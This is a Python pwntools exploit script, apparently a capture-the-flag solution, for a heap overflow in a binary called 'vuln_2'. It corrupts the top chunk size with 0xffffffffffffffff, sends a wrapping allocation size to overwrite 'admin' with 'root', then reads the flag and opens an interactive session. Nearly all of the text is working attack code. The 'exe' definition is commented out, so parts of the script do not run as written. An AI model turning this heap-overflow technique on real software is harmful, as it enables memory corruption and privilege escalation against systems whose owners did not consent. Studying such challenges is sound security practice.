#!/usr/bin/env python3

from pwn import *

#exe = context.binary = ELF('vuln_2')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.HOST:
        return remote(args.HOST, int(args.PORT))
    elif args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
break main
break create_user
continue

'''.format(**locals())

io = start()

#create user
io.sendline(b"1")

#buffer overflow chunk
payload = b"A"*24+p64(0xffffffffffffffff)
print(payload)
io.sendline(payload)

#change variable to root
payload = b"root"
io.sendline(payload)

#wrap heap meamory and overwrite "admin" to "root"
#here you must know top_chunk and virutal addres of "admin" on heap
#next substrac each other and it return "b"
#next you substract 0xffffffffffffffff - b => it will wrap to "admin" address
a = 0xffffffffffffffff
#b = 0x14c0
b = 0xa0
payload = "{payload}".format(payload=a-b)
print(payload)
io.sendline(payload)

#read flag by root
io.sendline(b"2")

io.interactive()







